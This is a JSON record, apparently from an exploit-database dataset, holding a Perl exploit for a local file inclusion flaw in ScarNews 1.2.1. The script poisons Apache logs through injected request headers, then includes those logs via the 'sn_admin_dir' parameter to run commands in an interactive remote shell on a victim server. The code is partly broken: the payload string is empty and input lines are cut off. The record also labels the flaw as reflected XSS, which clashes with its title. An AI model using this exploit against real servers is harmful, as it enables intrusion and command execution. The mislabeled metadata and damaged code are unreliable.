{
  "id": "3687",
  "title": "ScarNews 1.2.1 - &#039;sn_admin_dir&#039; Local File Inclusion",
  "cve": "CVE-2007-1932",
  "vuln_type": "xss_reflected",
  "code": "#Perl\r\n#\r\n#BeyazKurt\r\n#\r\n#ScarNews (sn_admin_dir) Local File Inclusion Exploit\r\n#\r\n# D0rk     : \"Powered by ScarNews v1.2.1\" dorka gerenk yok ama nese :p\r\n# kodlad...m 2 scriptte di.er makinayla uctu :( :(\r\n#\r\n#Str0ke \u00fczme kendini olur b\u00f6le .eler :)\r\n#\r\n#Download : http://www.scar4u.de/scripts/scarnews/download.html\r\n#\r\n#Coded by elden ele ge\u00e7io :)\r\n#\r\n# Shikaa get t\u00fcrk\u00e7e kas :D bi laf anlatcaz anlam.on a.g nese hotmail xss'leri s\u00f6m\u00fcr s\u00f6m\u00fcrebild.in #kadar :D\r\n#\r\nuse IO::Socket;\r\nuse LWP::Simple;\r\n#ripped\r\n@apache=(\r\n\"../../../../../var/log/httpd/access_log\",\r\n\"../../../../../var/log/httpd/error_log\",\r\n\"../apache/logs/error.log\",\r\n\"../apache/logs/access.log\",\r\n\"../../apache/logs/error.log\",\r\n\"../../apache/logs/access.log\",\r\n\"../../../apache/logs/error.log\",\r\n\"../../../apache/logs/access.log\",\r\n\"../../../../apache/logs/error.log\",\r\n\"../../../../apache/logs/access.log\",\r\n\"../../../../../apache/logs/error.log\",\r\n\"../../../../../apache/logs/access.log\",\r\n\"../logs/error.log\",\r\n\"../logs/access.log\",\r\n\"../../logs/error.log\",\r\n\"../../logs/access.log\",\r\n\"../../../logs/error.log\",\r\n\"../../../logs/access.log\",\r\n\"../../../../logs/error.log\",\r\n\"../../../../logs/access.log\",\r\n\"../../../../../logs/error.log\",\r\n\"../../../../../logs/access.log\",\r\n\"../../../../../etc/httpd/logs/access_log\",\r\n\"../../../../../etc/httpd/logs/access.log\",\r\n\"../../../../../etc/httpd/logs/error_log\",\r\n\"../../../../../etc/httpd/logs/error.log\",\r\n\"../../.. /../../var/www/logs/access_log\",\r\n\"../../../../../var/www/logs/access.log\",\r\n\"../../../../../usr/local/apache/logs/access_log\",\r\n\"../../../../../usr/local/apache/logs/access.log\",\r\n\"../../../../../var/log/apache/access_log\",\r\n\"../../../../../var/log/apache/access.log\",\r\n\"../../../../../var/log/access_log\",\r\n\"../../../../../var/www/logs/error_log\",\r\n\"../../../../../var/www/logs/error.log\",\r\n\"../../../../../usr/local/apache/logs/error_log\",\r\n\"../../../../../usr/local/apache/logs/error.log\",\r\n\"../../../../../var/log/apache/error_log\",\r\n\"../../../../../var/log/apache/error.log\",\r\n\"../../../../../var/log/access_log\",\r\n\"../../../../../var/log/error_log\"\r\n);\r\nif (@ARGV < 3) {\r\nprint \"\r\nScarNews (sn_admin_dir) Local File Inclusion Exploit\r\n###############################################################\r\nKullan.m : exploit.pl [victim] [apachepath]\r\n###############################################################\r\n\";\r\nexit();\r\n}\r\n$host=$ARGV[0];\r\n$path=$ARGV[1];\r\n$apachepath=$ARGV[2];\r\nprint \"Code is injecting in logfiles...\\n\";\r\n$CODE=\"\";\r\n$socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$host\", PeerPort=>\"80\") or die \"Connection failed.\\n\\n\";\r\nprint $socket \"GET \".$path.$CODE.\" HTTP/1.1\\r\\n\";\r\nprint $socket \"user-Agent: \".$CODE.\"\\r\\n\";\r\nprint $socket \"Host: \".$host.\"\\r\\n\";\r\nprint $socket \"Connection: close\\r\\n\\r\\n\";\r\nclose($socket);\r\nprint \"Write END to exit!\\n\";\r\nprint \"If not working try another apache path\\n\\n\";\r\nprint \"[shell] \";$cmd = ;\r\nwhile($cmd !~ \"END\") {\r\n$socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$host\", PeerPort=>\"80\") or die \"Connection failed.\\n\\n\";\r\n#now include parameter\r\nprint $socket \"GET \".$path.\"scarnews.inc.php?sn_admin_dir=\".$apache[$apachepath].\"%00&cmd=$cmd HTTP/1.1\\r\\n\";\r\nprint $socket \"Host: \".$host.\"\\r\\n\";\r\nprint $socket \"Accept: */*\\r\\n\";\r\nprint $socket \"Connection: close\\r\\n\\r\\n\";\r\nwhile ($raspuns = <$socket>)\r\n{\r\nprint $raspuns;\r\n}\r\nprint \"[shell] \";\r\n$cmd = ;\r\n}\r\n\r\n# milw0rm.com [2007-04-08]",
  "url": "https://www.exploit-db.com/exploits/3687"
}